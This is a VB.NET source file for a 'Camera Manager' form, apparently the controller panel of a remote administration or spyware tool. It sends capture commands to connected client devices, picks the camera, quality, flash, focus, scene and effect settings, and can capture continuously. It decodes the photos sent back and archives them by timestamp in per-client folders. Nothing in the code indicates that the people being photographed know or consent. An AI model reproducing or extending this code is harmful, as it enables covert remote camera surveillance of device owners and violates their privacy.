﻿Imports System.ComponentModel

Public Class Camera_Manager

    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String

    Dim c As New PictureBox
    Sub Client_data(ByVal data As String, ByVal Camera As String)
        Try
            If data IsNot Nothing Then


                If data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]") Then
                    Dim spl_Exception() As String = {"[My/Exception]"}
                    Dim p() As String = data.Split(spl_Exception, StringSplitOptions.RemoveEmptyEntries)
                    Label1.Text = p(0)
                    If Label4.Visible = True Then Label4.Visible = False
                    If Panel3.Visible = False Then Panel3.Visible = True

                    If CheckBox1.Checked = True Then
                        CheckBox1.Checked = False
                        If Button1.Text = "stop" Then
                            Button1.Text = "start"
                        End If
                    End If

                Else
                    If Camera = "IFoundCamera" Then
                        ComboBox1.Items.Clear()
                        Dim spl_LN() As String = {Form1.s.split_Line}
                        Dim ln() As String = data.Split(spl_LN, StringSplitOptions.RemoveEmptyEntries)
                        For i As Integer = 0 To ln.Length - 1
                            Dim split_Ary() As String = {Form1.s.split_Ary}
                            Dim Ary() As String = ln(i).Split(split_Ary, StringSplitOptions.RemoveEmptyEntries)
                            ComboBox1.Items.Add(Ary(0) + Space(1) + Ary(1))
                        Next
                        If ComboBox1.Items.Count > 0 Then
                            ComboBox1.Text = ComboBox1.Items(0)
                        End If


                    ElseIf Camera = "ITookPicture" Then


                        If CheckBox1.Checked = True And Button1.Text = "stop" Then
                            cap()
                        End If





                        Dim bytes() As Byte = Convert.FromBase64String(data)
                        Dim MS As New System.IO.MemoryStream(bytes)
                        Dim bmp As Image = Image.FromStream(MS)

                        c.Image = bmp
                        If l > 1 Then
                            For i% = 2 To l
                                rot(i)
                            Next
                        End If



                        PictureBox1.Image = c.Image




                        Dim f As String = Application.StartupPath & "\" & store_0.name_folder_app_resource & "\Folder_Clients\" & Name_Client & Client_ID & "\" & "Camera_Manager"
                        If Not My.Computer.FileSystem.DirectoryExists(f) Then My.Computer.FileSystem.CreateDirectory(f)
                        Dim Dat_2 As String = DateTime.Now.ToString("yyyy-MM-dd-HH.mm.ss")
                        Dim NAM_2 As String = String.Format("{0:1}", Dat_2, Nothing)
                        bmp.Save(f + "\" + NAM_2 + ".Jpeg", System.Drawing.Imaging.ImageFormat.Jpeg)

                    End If


                    If Label4.Visible = True Then Label4.Visible = False

                    If Panel3.Visible = True Then Panel3.Visible = False






                End If

                refres_title()

                If Not ComboBox1.Items.Count > 0 Then
                    Panel1.Enabled = False
                End If

            End If
        Catch ex As Exception

            'MsgBox(ex.ToString)
        End Try
    End Sub
    Private Sub refres_title()
        Dim title As String = String.Format("Camera Manager" + " - Remote Address & Port: {0} Client Name: {1}", Client_remote_Address, Name_Client)
        Text = title
    End Sub
    Private Sub Camera_Manager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        SceneModeToolStripMenuItem.Image = store_0.Bitmap_0("ctx_scene")
        EffectsToolStripMenuItem.Image = store_0.Bitmap_0("ctx_effects")
        FlashModeToolStripMenuItem.Image = store_0.Bitmap_0("ctx_flash")
        FocusModeToolStripMenuItem.Image = store_0.Bitmap_0("ctx_foces")
        Me.Panel2.Location = New System.Drawing.Point(-70, 44)
        ContextMenuStrip1.Renderer = New Theme_0
        Label4.Parent = PictureBox1
        Label4.BackColor = Color.Transparent
        Label4.BringToFront()


        'Panel2.Parent = PictureBox1


        'Panel2.BackColor = Color.Transparent
        'Panel2.BringToFront()

        'PictureBox2.Parent = Panel2
        'PictureBox2.BackColor = Color.Transparent
        'PictureBox2.BringToFront()

        L1.Image = store_0.Bitmap_0("Rotate180")

        'Label4.Location = New Point(5, 5)

        PictureBox2.Image = store_0.Bitmap_0("ri_arr")
        refres_title()
        Me.Icon = store_0.icons_0("window")
    End Sub
    Private Function SetParameters() As String
        Dim GroupParameters$ = Nothing

        For Each itm In FlashModeToolStripMenuItem.DropDown.Items
            If itm.Checked Then
                GroupParameters += "1"
            Else
                GroupParameters += "0"
            End If
        Next
        For Each itm In FocusModeToolStripMenuItem.DropDown.Items
            If itm.Checked Then
                GroupParameters += "1"
            Else
                GroupParameters += "0"
            End If
        Next
        For Each itm In SceneModeToolStripMenuItem.DropDown.Items
            If itm.Checked Then
                GroupParameters += "1"
            Else
                GroupParameters += "0"
            End If
        Next
        For Each itm In EffectsToolStripMenuItem.DropDown.Items
            If itm.Checked Then
                GroupParameters += "1"
            Else
                GroupParameters += "0"
            End If
        Next
        Return GroupParameters
    End Function
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click


        If Button1.Text = "stop" Then
            If CheckBox1.Checked = True Then
                Button1.Text = "start"
            Else
                Button1.Text = "Capture"
            End If
        ElseIf Button1.Text = "start" Then
            Button1.Text = "stop"
        End If

        cap()
    End Sub
    Private Sub cap()
        Dim itm1$ = ComboBox1.Text
        Dim itm2$ = ComboBox2.Text
        If Not itm1 = Nothing And Not itm2 = Nothing Then
            If itm1.Contains("Camera") And itm2.Contains("%") Then
                Dim split_CameraID() As String = {"Camera"}
                Dim Ary() As String = itm1.Split(split_CameraID, StringSplitOptions.RemoveEmptyEntries)
                Dim Camera_ID$ = Ary(1).Trim
                Dim split_CameraQuality() As String = {"%"}
                Dim Aryq() As String = itm2.Split(split_CameraQuality, StringSplitOptions.RemoveEmptyEntries)
                Dim Quality$ = Aryq(0).Trim


                If Label4.Visible = False Then Label4.Visible = True

                Form1.s.Send(handle_Number_Client, "camera_manager_capture" + Form1.s.SplitData + Camera_ID + Form1.s.SplitData + Quality + Form1.s.SplitData + SetParameters())
            End If
        End If
    End Sub


    Private Sub ComboBox1_KeyPress(sender As Object, e As KeyPressEventArgs) Handles ComboBox1.KeyPress
        e.Handled = True
    End Sub
    Private Sub ComboBox2_KeyPress(sender As Object, e As KeyPressEventArgs) Handles ComboBox2.KeyPress
        e.Handled = True
    End Sub
#Region " Camera Parameters "
    'flash mode
    Private Sub AutoToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AutoToolStripMenuItem.Click
        AutoToolStripMenuItem.Checked = True
        ONToolStripMenuItem.Checked = False
        OFFToolStripMenuItem.Checked = False
    End Sub
    Private Sub ONToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ONToolStripMenuItem.Click
        ONToolStripMenuItem.Checked = True
        AutoToolStripMenuItem.Checked = False
        OFFToolStripMenuItem.Checked = False
    End Sub
    Private Sub OFFToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OFFToolStripMenuItem.Click
        OFFToolStripMenuItem.Checked = True
        ONToolStripMenuItem.Checked = False
        AutoToolStripMenuItem.Checked = False
    End Sub
    'Focus Mode
    Private Sub AutoToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles AutoToolStripMenuItem1.Click
        AutoToolStripMenuItem1.Checked = True
        EdofToolStripMenuItem.Checked = False
        FixedToolStripMenuItem.Checked = False
    End Sub
    Private Sub EdofToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EdofToolStripMenuItem.Click
        EdofToolStripMenuItem.Checked = True
        AutoToolStripMenuItem1.Checked = False
        FixedToolStripMenuItem.Checked = False
    End Sub
    Private Sub FixedToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FixedToolStripMenuItem.Click
        FixedToolStripMenuItem.Checked = True
        EdofToolStripMenuItem.Checked = False
        AutoToolStripMenuItem1.Checked = False
    End Sub
    'Scene Mode
    Private Sub AutoToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles AutoToolStripMenuItem2.Click
        AutoToolStripMenuItem2.Checked = True
        NightToolStripMenuItem.Checked = False
        SportsToolStripMenuItem.Checked = False
        PartyToolStripMenuItem.Checked = False
    End Sub
    Private Sub NightToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NightToolStripMenuItem.Click
        NightToolStripMenuItem.Checked = True
        AutoToolStripMenuItem2.Checked = False
        SportsToolStripMenuItem.Checked = False
        PartyToolStripMenuItem.Checked = False
    End Sub
    Private Sub SportsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SportsToolStripMenuItem.Click
        SportsToolStripMenuItem.Checked = True
        NightToolStripMenuItem.Checked = False
        AutoToolStripMenuItem2.Checked = False
        PartyToolStripMenuItem.Checked = False
    End Sub
    Private Sub PartyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PartyToolStripMenuItem.Click
        PartyToolStripMenuItem.Checked = True
        SportsToolStripMenuItem.Checked = False
        NightToolStripMenuItem.Checked = False
        AutoToolStripMenuItem2.Checked = False

    End Sub
    'EFFECTS
    Private Sub EFFECTNONEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EFFECTNONEToolStripMenuItem.Click
        EFFECTNONEToolStripMenuItem.Checked = True
        EFFECTNEGATIVEToolStripMenuItem.Checked = False
        EFFECTAQUAToolStripMenuItem.Checked = False
        EFFECTBLACKBOARDToolStripMenuItem.Checked = False
        EFFECTMONOToolStripMenuItem.Checked = False
        EFFECTPOSTERIZEToolStripMenuItem.Checked = False
        EFFECTSEPIAToolStripMenuItem.Checked = False
        EFFECTWHITEBOARDToolStripMenuItem.Checked = False
    End Sub

    Private Sub EFFECTNEGATIVEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EFFECTNEGATIVEToolStripMenuItem.Click
        EFFECTNEGATIVEToolStripMenuItem.Checked = True
        EFFECTNONEToolStripMenuItem.Checked = False
        EFFECTAQUAToolStripMenuItem.Checked = False
        EFFECTBLACKBOARDToolStripMenuItem.Checked = False
        EFFECTMONOToolStripMenuItem.Checked = False
        EFFECTPOSTERIZEToolStripMenuItem.Checked = False
        EFFECTSEPIAToolStripMenuItem.Checked = False
        EFFECTWHITEBOARDToolStripMenuItem.Checked = False
    End Sub

    Private Sub EFFECTAQUAToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EFFECTAQUAToolStripMenuItem.Click
        EFFECTAQUAToolStripMenuItem.Checked = True
        EFFECTNEGATIVEToolStripMenuItem.Checked = False
        EFFECTNONEToolStripMenuItem.Checked = False
        EFFECTBLACKBOARDToolStripMenuItem.Checked = False
        EFFECTMONOToolStripMenuItem.Checked = False
        EFFECTPOSTERIZEToolStripMenuItem.Checked = False
        EFFECTSEPIAToolStripMenuItem.Checked = False
        EFFECTWHITEBOARDToolStripMenuItem.Checked = False
    End Sub

    Private Sub EFFECTBLACKBOARDToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EFFECTBLACKBOARDToolStripMenuItem.Click
        EFFECTBLACKBOARDToolStripMenuItem.Checked = True
        EFFECTAQUAToolStripMenuItem.Checked = False
        EFFECTNEGATIVEToolStripMenuItem.Checked = False
        EFFECTNONEToolStripMenuItem.Checked = False
        EFFECTMONOToolStripMenuItem.Checked = False
        EFFECTPOSTERIZEToolStripMenuItem.Checked = False
        EFFECTSEPIAToolStripMenuItem.Checked = False
        EFFECTWHITEBOARDToolStripMenuItem.Checked = False
    End Sub

    Private Sub EFFECTMONOToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EFFECTMONOToolStripMenuItem.Click
        EFFECTMONOToolStripMenuItem.Checked = True
        EFFECTBLACKBOARDToolStripMenuItem.Checked = False
        EFFECTAQUAToolStripMenuItem.Checked = False
        EFFECTNEGATIVEToolStripMenuItem.Checked = False
        EFFECTNONEToolStripMenuItem.Checked = False
        EFFECTPOSTERIZEToolStripMenuItem.Checked = False
        EFFECTSEPIAToolStripMenuItem.Checked = False
        EFFECTWHITEBOARDToolStripMenuItem.Checked = False
    End Sub

    Private Sub EFFECTPOSTERIZEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EFFECTPOSTERIZEToolStripMenuItem.Click
        EFFECTPOSTERIZEToolStripMenuItem.Checked = True
        EFFECTMONOToolStripMenuItem.Checked = False
        EFFECTBLACKBOARDToolStripMenuItem.Checked = False
        EFFECTAQUAToolStripMenuItem.Checked = False
        EFFECTNEGATIVEToolStripMenuItem.Checked = False
        EFFECTNONEToolStripMenuItem.Checked = False
        EFFECTSEPIAToolStripMenuItem.Checked = False
        EFFECTWHITEBOARDToolStripMenuItem.Checked = False
    End Sub

    Private Sub EFFECTSEPIAToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EFFECTSEPIAToolStripMenuItem.Click
        EFFECTSEPIAToolStripMenuItem.Checked = True
        EFFECTPOSTERIZEToolStripMenuItem.Checked = False
        EFFECTMONOToolStripMenuItem.Checked = False
        EFFECTBLACKBOARDToolStripMenuItem.Checked = False
        EFFECTAQUAToolStripMenuItem.Checked = False
        EFFECTNEGATIVEToolStripMenuItem.Checked = False
        EFFECTNONEToolStripMenuItem.Checked = False
        EFFECTWHITEBOARDToolStripMenuItem.Checked = False
    End Sub

    Private Sub EFFECTWHITEBOARDToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EFFECTWHITEBOARDToolStripMenuItem.Click
        EFFECTWHITEBOARDToolStripMenuItem.Checked = True
        EFFECTSEPIAToolStripMenuItem.Checked = False
        EFFECTPOSTERIZEToolStripMenuItem.Checked = False
        EFFECTMONOToolStripMenuItem.Checked = False
        EFFECTBLACKBOARDToolStripMenuItem.Checked = False
        EFFECTAQUAToolStripMenuItem.Checked = False
        EFFECTNEGATIVEToolStripMenuItem.Checked = False
        EFFECTNONEToolStripMenuItem.Checked = False

    End Sub
    Dim l% = 1
    Private Sub rot(A%)
        Select Case A

            Case 2
                'يسار
                c.Image.RotateFlip(RotateFlipType.Rotate90FlipX)
            Case 3
                'يمين
                c.Image.RotateFlip(RotateFlipType.Rotate90FlipY)
            Case 4
                'يسار
                c.Image.RotateFlip(RotateFlipType.Rotate90FlipX)
            Case 5
                c.Image.RotateFlip(RotateFlipType.Rotate90FlipY)
                l = 1
        End Select
        c.Refresh()
        PictureBox1.Image = c.Image
    End Sub
    Private Sub Camera_Manager_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Form1.s.Send(handle_Number_Client, "camera_manager_stop")
    End Sub
    Dim bo As Boolean = False
    Private Sub arr()
        If PictureBox2.Tag = "On" Then
            bo = True
            Me.Panel2.Location = New System.Drawing.Point(3, 44)
            PictureBox2.Tag = "off"
            PictureBox2.Image = store_0.Bitmap_0("li_arr")

        Else
            bo = False
            Me.Panel2.Location = New System.Drawing.Point(-35, 44)
            PictureBox2.Tag = "On"
            PictureBox2.Image = store_0.Bitmap_0("ri_arr")

        End If
    End Sub
#End Region


    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            Button1.Text = "start"
        Else
            Button1.Text = "Capture"
        End If
    End Sub



    Private Sub PictureBox1_MouseMove(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseMove
        'Text = "X." & e.X & "Y." & e.Y

        If e.X < 20 Then
            If bo = False Then
                If Timer1.Enabled = True Then Timer1.Enabled = False
                If Not int = -36 Then
                    int = -36
                End If
                If Not nextlop = 0 Then
                    nextlop = 0
                End If
                arr()
            End If
            Else
            If bo = True Then
                arr()
                Timer1.Enabled = True
            End If

        End If


    End Sub
    Dim int% = -36
    Dim nextlop% = 0
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        nextlop += 1
        If nextlop > 30 Then
            If int >= -70 Then
                Me.Panel2.Location = New System.Drawing.Point(int, 44)
                int -= 1
            Else
                int = -36
                nextlop = 0
                Timer1.Enabled = False
            End If
        Else
            Me.Panel2.Location = New System.Drawing.Point(-36, 44)
        End If




    End Sub

    Private Sub L1_Click(sender As Object, e As EventArgs) Handles L1.Click
        If PictureBox1.Image IsNot Nothing Then
            l += 1
            rot(l)
        End If
    End Sub


End Class